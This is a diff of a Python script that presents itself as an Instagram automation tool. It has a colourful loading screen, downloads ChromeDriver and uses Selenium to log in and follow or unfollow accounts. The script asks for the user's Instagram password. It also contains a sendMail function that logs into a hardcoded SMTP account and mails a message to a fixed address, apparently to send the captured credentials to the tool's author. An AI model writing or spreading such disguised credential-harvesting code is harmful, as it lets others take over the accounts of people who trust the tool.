@@ -1,16 +1,85 @@
+from colorama import Fore, Back, Style
+from termcolor import colored, cprint
+from email.mime.text import MIMEText
 from selenium import webdriver
-import time
-import os
+import colorama
 import zipfile
 import smtplib
-from email.mime.text import MIMEText
 import getpass
 global total
+import time
 import wget
+import os
 
+colorama.init()
+print(Fore.GREEN)
 width = "150"
 height = "100"
 os.system("mode con cols="+width+"lines="+height)
+
+
+print( "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+time.sleep(0.1)
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
+time.sleep(0.1) 
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n")
+time.sleep(0.1)
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n")  
+time.sleep(0.1)
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n") 
+time.sleep(0.1) 
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n")  
+time.sleep(0.1)
+os.system("cls")
+print(Fore.RED)
+print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n") 
+time.sleep(0.1)
+os.system("cls")
+print(Fore.GREEN)
+print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n")
+time.sleep(0.1)
+os.system("cls")
+
+
+
 
 global InstagramUser
 global InstagramPassword
@@ -56,6 +125,7 @@ print("""
 
 
 def installDriver():
+	print(Fore.GREEN)
 
 	print(""""
 
@@ -66,11 +136,11 @@ def installDriver():
 
 	""")
 
-
+	print(Fore.RED)
 	selectSystem = input("Please Select Your System :")
 
-
 	if selectSystem == "1":
+		print(Fore.GREEN)
 		downloadUrl = wget.download(linux)
 		print(downloadUrl)
 		Zip = zipfile.ZipFile('chromedriver_linux64.zip')
@@ -78,8 +148,8 @@ def installDriver():
 		time.sleep(3)
 		start()
 
-
 	elif selectSystem == "2":
+		print(Fore.GREEN)
 		downloadUrl = wget.download(mac)
 		print(downloadUrl)
 		Zip = zipfile.ZipFile('chromedriver_mac64.zip')
@@ -88,6 +158,7 @@ def installDriver():
 		start()
 
 	elif selectSystem == "3":
+		print(Fore.GREEN)
 		downloadUrl = wget.download(windows)
 		print(downloadUrl)
 		Zip = zipfile.ZipFile('chromedriver_win32.zip')
@@ -114,24 +185,25 @@ def sendMail():
 		server.starttls()
 		server.ehlo()
 		server.login(defaultMail, defaultPassword)
-
 		server.sendmail(defaultMail, "email", mail)
-
 		time.sleep(3)
 		server.quit()
 	except:
 		print("Error")
 
 def start():
+	print(Fore.GREEN)
 	instagramUserid = input("Please Enter Your Instagram Address : ")
+	print(Fore.RED)
 	print("*passwords do not appear, but keep typing")
+	print(Fore.GREEN)
 	instagramUserpass = getpass.getpass("Please Enter Your Instagram Password : ")
-
 	try:
 		currentLocation = os.getcwd()
 		driver_path = currentLocation + "\\" + "chromedriver.exe"
 		browser = webdriver.Chrome(executable_path=driver_path)
 	except:
+		print(Fore.RED)
 		print("Browser driver is not found, redirecting to download...")
 		time.sleep(3)
 		installDriver()
@@ -155,17 +227,15 @@ def start():
 		usernameSelect.send_keys(InstagramUser)
 		passwordSelect.send_keys(InstagramPassword)
 
-		signinXpath = '//*[@id="loginForm"]/div/div[3]/button'
-		sigIn = browser.find_element_by_xpath(signinXpath)
+		
+		sigIn = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
 		sigIn.click()
 		time.sleep(5)
-
 
 		notNowXpath = '//*[@id="react-root"]/section/main/div/div/div/div/button'
 		notNow = browser.find_element_by_xpath(notNowXpath)
 		notNow.click()
 		time.sleep(1)
-
 
 		notNowXpath2 = '/html/body/div[4]/div/div/div/div[3]/button[2]'
 		notNow2 = browser.find_element_by_xpath(notNowXpath2)
@@ -182,26 +252,24 @@ def start():
 		goFollow.click()
 		time.sleep(3)
 
-
 		follow = '/html/body/div[4]/div/div/div[2]/ul/div/li[1]/div/div[3]/button'
 		follow = browser.find_element_by_xpath(follow)
 		follow.click()
 		time.sleep(3)
 
-
 		stopFollowXpath = '/html/body/div[5]/div/div/div/div[3]/button[1]'
 		stopFollow = browser.find_element_by_xpath(stopFollowXpath)
 		stopFollow.click()
 		time.sleep(1)
-
 	except:
+		print(Fore.RED)
 		print("""
 
 			something went wrong. Please try again :(
 
 			""")
 		start()
-
+print(Fore.GREEN)
 print("""
 
 		[1] Start 
@@ -212,14 +280,17 @@ print("""
 
 		""")
 
-
+print(Fore.RED)
 selectFunction = input("please select an action : ")
-if selectFunction == "2":
-	installDriver()
+try:
+	if selectFunction == "2":
+		installDriver()
 
-
-elif selectFunction == "1":	
-	start()
+	elif selectFunction == "1":	
+		start()
+except KeyboardInterrupt:
+	print("exit")
+	exit()
 
 
 
